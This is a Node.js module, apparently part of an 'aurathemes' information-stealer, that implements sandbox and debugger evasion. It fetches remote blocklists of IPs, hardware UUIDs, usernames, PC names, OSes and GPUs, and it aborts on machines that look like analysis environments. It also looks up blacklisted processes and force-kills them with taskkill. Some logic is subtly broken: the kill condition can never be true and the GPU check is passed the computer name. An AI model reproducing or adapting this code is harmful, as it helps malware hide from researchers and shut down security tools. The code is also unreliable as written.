const process = require("process");
const util = require("util");
const child_process = require("child_process");
const fetch = (...a) => import('node-fetch').then(({ default: fetch }) => fetch(...a));
const exec = util.promisify(child_process.exec);

const request = async (u) => {
  try {
    let r = await fetch(u);
    return r.json();
  } catch (e) {
    console.error(e);
    return {};
  }
};

const killer = async (u, c) => {
  try {
    let d = await request(u),
      {
        stdout
      } = await exec(c),
      s = stdout.split(/\r?\n/),
      b = d.blacklistedprog;
    for (p of s) {
      let n = p.split(/\s+/)[0].replace(".exe", "");
      if (!n.toLowerCase() === "cmd" && b.includes(n)) {
        try {
          await exec(`taskkill /F /IM ${n}.exe`);
        } catch (err) {
          return ""
        }
      }
    }
  } catch (e) {
    console.error(e);
  }
};

const IS_BLOCKED = async (u, v) => {
  try {
    const d = await request(u);
    return d.includes(v);
  } catch (e) {
    console.error(e);
    return false;
  }
};

const KILL_BLACK = async () => await killer("https://6889-fun.vercel.app/api/aurathemes/bypass/blacklist/progr?aurathemes=true","tasklist");

const CHECK_BLOCKED = async (u, v) => await IS_BLOCKED(`https://6889-fun.vercel.app/api/aurathemes/bypass/blocked/${u}?aurathemes=true`, v);

const GPU_BLOCKED = async (u) => await CHECK_BLOCKED("gpus", u);

const OS_BLOCKED = async (q) => await CHECK_BLOCKED("oss", q);

const PCNAME_BLOCKED = async (r) => await CHECK_BLOCKED("pcnames", r);

const USERNAME_BLOCKED = async (f) => await CHECK_BLOCKED("progr", f);

const UUID_BLOCKED = async (a) => await CHECK_BLOCKED("uuids", a);

const IP_BLOCKED = async (s) => await CHECK_BLOCKED("ips", s);

const debuggerx = async (a, d, r, i, c, l, q, ñ, p, w, z) => {
  if (a === "no") return;
  try {
    const [ p, u ] = [process.env.COMPUTERNAME || "Not found",process.env.USERNAME || "Not found",];
    const [ g, h, j, k, f, m ] = await Promise.all([
      IP_BLOCKED(l),
      UUID_BLOCKED(i),
      USERNAME_BLOCKED(u),
      PCNAME_BLOCKED(p),
      OS_BLOCKED(q),
      GPU_BLOCKED(p),
    ]);
    if ((!isNaN(d) && d < 80 && !isNaN(r) && r < 2)|| (!isNaN(c) && c < 2) || g || h || j || k || f || m) process.abort() && process.exit(1);
    try {
      await KILL_BLACK();
    } catch (e) {
      console.error(e);
    }
  } catch (e) {
    console.error(e);
  }
};

module.exports = {
  debuggerx,
};
